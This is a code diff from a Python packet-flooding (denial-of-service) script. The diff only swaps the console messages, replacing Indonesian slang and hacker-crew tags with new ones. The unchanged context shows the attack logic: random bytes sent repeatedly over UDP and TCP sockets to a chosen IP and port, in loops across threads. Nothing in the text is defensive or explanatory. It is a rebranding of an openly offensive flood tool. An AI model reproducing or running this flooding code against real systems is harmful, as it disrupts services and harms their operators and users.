@@ -26,9 +26,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XTraylinz x XNextTime NIH BOS !! ")
+			print(i +" XXBR NII SENGGOL DONG !! ")
 		except:
-			print("[!] GASUKA BAYWAN DECK")
+			print("[!] ADA PAKET DARI XXBR")
 
 def run2():
 	data = random._urandom(16)
@@ -40,10 +40,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" XTraylinz x XNextTime NIH BOS !! ")
+			print(i +" XXBR NII SENGGOL DONG  !! ")
 		except:
 			s.close()
-			print("[*] GASUKA BAYWAN DECK")
+			print("[*] ADA PAKET DARI XXBR")
             
 for y in range(threads):
 	if choice == 'y':
